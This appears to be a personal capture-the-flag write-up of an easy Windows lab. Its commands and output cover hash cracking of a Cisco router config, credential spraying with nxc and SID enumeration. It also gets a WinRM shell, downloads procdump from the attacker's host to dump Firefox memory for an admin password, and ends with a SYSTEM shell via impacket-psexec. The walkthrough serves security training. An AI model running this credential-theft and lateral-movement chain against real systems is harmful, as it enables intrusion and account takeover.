

## Lab Details
- Difficulty: Easy
- OS: Windows

## Summary
- Initial access:
- Privilege escalation:

## Enumeration
#### Steps
- run `nmap`
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
| http-title: Support Login Page
|_Requested resource was login.php
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
```
## Foothold

#### Steps
- Visit the port 80 directs us to `http://10.129.175.99/login.php`
![[Pasted image 20260528075155.png]]

- Click on `Login as guest`
![[Pasted image 20260528080547.png]]

- Click on attachment
```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```
- Its a `cisco` config file  and we can attempt to decrypt the cisco hashes using `cisco7crack`
```
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```
- Cracked using `cisco7crack`
```
$ cisco7crack 0242114B0E143F015F5D1E161713
Encrypted string : 0242114B0E143F015F5D1E161713
Plain string     : $uperP@ssword

$ cisco7crack 02375012182C1A1D751618034F36415408
Encrypted string : 02375012182C1A1D751618034F36415408
Plain string     : Q4)sJu\Y8qz*A3?d
```
- There is also a md5 hash which can be cracked using `hashcat`
```
$ hashcat hash /usr/share/wordlists/rockyou.txt
<SNIP>
$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
<SNIP>
```
- Once we have the cracked password we can attempt to spray for valid authentication
- Found we have auth as user `Hazard`
```
$ nxc smb  10.129.175.99 -u Hazard -p 'stealth1agent' --local-auth
SMB         10.129.175.99   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SUPPORTDESK) (signing:False) (SMBv1:None)
SMB         10.129.175.99   445    SUPPORTDESK      [+] SUPPORTDESK\Hazard:stealth1agent
```
- Perform further enumeration against the target we see that user `Hazard` has read access to `IPC$`
```
$ nxc smb  10.129.175.99 -u Hazard -p 'stealth1agent' --shares
SMB         10.129.175.99   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:None)
SMB         10.129.175.99   445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent
SMB         10.129.175.99   445    SUPPORTDESK      [*] Enumerated shares
SMB         10.129.175.99   445    SUPPORTDESK      Share           Permissions     Remark
SMB         10.129.175.99   445    SUPPORTDESK      -----           -----------     ------
SMB         10.129.175.99   445    SUPPORTDESK      ADMIN$                          Remote Admin
SMB         10.129.175.99   445    SUPPORTDESK      C$                              Default share
SMB         10.129.175.99   445    SUPPORTDESK      IPC$            READ            Remote IPC
```
- We can use `impacket-lookupsid` to enumerate for users 
```
$ impacket-lookupsid SupportDesk/Hazard:stealth1agent@10.129.175.99
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at 10.129.175.99
[*] StringBinding ncacn_np:10.129.175.99[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```
- Once we have a list of users in the domain we can perform credential spray with existing passwords against the users 
```
$ nxc winrm 10.129.175.99 -u Chase  -p 'Q4)sJu\Y8qz*A3?d'
WINRM       10.129.175.99   5985   SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk)
WINRM       10.129.175.99   5985   SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)
```
- Found user chase has `winrm` access to target
- Obtain shell access as user Chase via `evil-winrm`
```
$ evil-winrm -i 10.129.175.99 -u Chase  -p 'Q4)sJu\Y8qz*A3?d'
```

## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Enumerate the file system and found todo.txt
```
*Evil-WinRM* PS C:\Users\Chase\Desktop> ls


    Directory: C:\Users\Chase\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2019   9:08 AM            121 todo.txt
-ar---        5/28/2026   4:09 AM             34 user.txt
```
- Examine the file and found a reference to Issues list
```
*Evil-WinRM* PS C:\Users\Chase\Desktop> cat todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```
- Load winpeas.exe and found `firefox` is running on the system
```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Firefox credentials file exists at C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default\key4.db
È Run SharpWeb (https://github.com/djhohnstein/SharpWeb)
```
- Unable to locate `Logins.json` file to decrypt password
```bash
$ strings FIREFOX.dump.dmp | grep admin
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```
- Attempted at dumping process from memory using `procdump.exe`
- First obtain the PID of `firefox`
```
*Evil-WinRM* PS C:\Users\Chase> wget http://10.10.14.109:8000/procdump64.exe -o procdump64.exe
*Evil-WinRM* PS C:\Users\Chase> get-process -name firefox

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    355      25    16408     296176       0.17   3540   1 firefox
   1078      70   145000     498592       6.88   6464   1 firefox
    347      19    10188     287064       0.06   6572   1 firefox
    401      34    34800     337692       1.20   6712   1 firefox
    378      28    23084     306188       0.28   7028   1 firefox
```
- Then dump to file
```
*Evil-WinRM* PS C:\Users\Chase> ./procdump64.exe -ma 3540 FIREFOX.dump -accepteula

ProcDump v12.0 - Sysinternals process dump utility
Copyright (C) 2009-2026 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[08:34:40]Dump 1 info: Available space: 3676868608
[08:34:40]Dump 1 initiated: C:\Users\Chase\FIREFOX.dump.dmp
[08:34:40]Dump 1 writing: Estimated dump file size is 298 MB.
[08:34:40]Dump 1 complete: 298 MB written in 0.5 seconds
[08:34:40]Dump count reached.
```
- And since its a binary file we will use strings and grep to search for any credentials
```
$ strings FIREFOX.dump.dmp | grep admin
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
<SNIP>
```
- Found password for admin user
- Checking validity with `nxc`
```
$ nxc smb 10.129.175.99 -u administrator -p '4dD!5}x/re8]FBuZ' --local-auth
SMB         10.129.175.99   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SUPPORTDESK) (signing:False) (SMBv1:None)
SMB         10.129.175.99   445    SUPPORTDESK      [+] SUPPORTDESK\administrator:4dD!5}x/re8]FBuZ (Pwn3d!)
```
- use `impacket-psexec` to obtain a shell as `NT Authority \ SYSTEM`
```
$ impacket-psexec SupportDesk/'administrator:4dD!5}x/re8]FBuZ'@10.129.175.99
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.175.99.....
[*] Found writable share ADMIN$
[*] Uploading file CbocMmhB.exe
[*] Opening SVCManager on 10.129.175.99.....
[*] Creating service hgwr on 10.129.175.99.....
[*] Starting service hgwr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.437]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
## Lessons Learned
- Attack family:
- Key takeaway:
	- Learned how to perform process dump using `procdump.exe`
	- Learned different ways to extract credential from `firefox`

## Resources
- References: